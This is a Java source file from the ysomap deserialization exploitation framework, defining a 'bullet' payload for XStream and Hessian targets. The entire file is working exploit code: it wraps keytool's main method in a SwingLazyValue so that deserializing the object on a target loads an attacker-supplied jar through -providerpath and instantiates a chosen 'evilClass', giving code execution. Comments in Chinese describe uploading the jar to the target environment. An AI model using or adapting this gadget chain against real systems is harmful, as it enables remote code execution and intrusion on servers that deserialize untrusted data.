package ysomap.bullets.jdk;

import sun.swing.SwingLazyValue;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("载入本地jar包")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithUrlClassLoaderBullet extends AbstractBullet<SwingLazyValue> {

    @NotNull
    @Require(name = "filepath", detail = "上传至目标环境的jar路径")
    public String filepath;

    @NotNull
    @Require(name = "evilClass", detail = "需要初始化的对象，默认调用无参构造函数")
    public String evilClass;

    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "sun.security.tools.keytool.Main";
        String methodName = "main";
        Object[] evilargs = new Object[]{new String[]{
                "-LIST",
                "-provider:",
                    evilClass,
                "-keystore",
                    "NONE",
                "-protected",
                "-debug",
                "-providerpath",
                    filepath
        }};
        return new SwingLazyValue(classname, methodName, evilargs);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new SwingLazyValueWithUrlClassLoaderBullet();
        bullet.set("filepath", args[0]);
        bullet.set("evilClass", args[1]);
        return bullet;
    }
}
